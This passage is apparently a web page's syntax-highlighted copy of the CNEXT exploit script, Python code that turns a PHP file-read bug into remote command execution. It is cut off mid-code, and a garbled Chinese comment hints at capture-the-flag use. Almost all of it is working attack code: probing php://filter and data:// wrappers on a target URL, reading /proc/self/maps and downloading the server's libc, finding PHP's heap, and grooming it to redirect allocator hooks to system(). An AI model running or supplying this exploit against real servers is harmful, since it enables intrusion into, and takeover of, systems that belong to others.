class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> path<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token comment"># åŒ¹é…è¯­å¥è®°å¾—æ ¹æ®é¢˜ç›®ç¯å¢ƒæ›´æ”¹</span>        <span class="token comment"># data = response.re.search(b"(.*)", flags=re.S).group(1)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>text        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """</span>                <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>                    <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"[anon:zend_alloc]"</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""On each step of the exploit, a filter will process each chunk one after the        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That's where the difficulties come from.        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00        By triggering the bug from chunk ..900, we get:        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???        That's step 3.        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That's step 2.        Now, if we were to perform step2 an then step3 without anything else, we'd have        a problem: after step2 has been processed, the free list goes bottom-up, like:        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900        We need to go the other way around. That's why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.        Another problem comes up.        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        "disappear" from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don't know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk>).        We make sure that the "system" command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.        The pad blocks just "pad" our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        """</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>       